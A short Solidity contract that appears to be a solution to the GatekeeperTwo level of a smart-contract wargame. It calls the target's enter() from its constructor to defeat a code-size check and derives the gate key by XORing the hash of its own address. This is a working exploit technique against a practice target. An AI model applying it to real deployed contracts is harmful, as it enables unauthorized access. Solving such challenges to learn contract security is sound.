// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "instances/14_GatekeeperTwo.sol";

contract AttackerGatekeeperTwo {
    constructor(address gatekeeperTwo) public {
        GatekeeperTwo(gatekeeperTwo).enter(
            bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                    (uint64(0) - 1)
            )
        );
    }
}
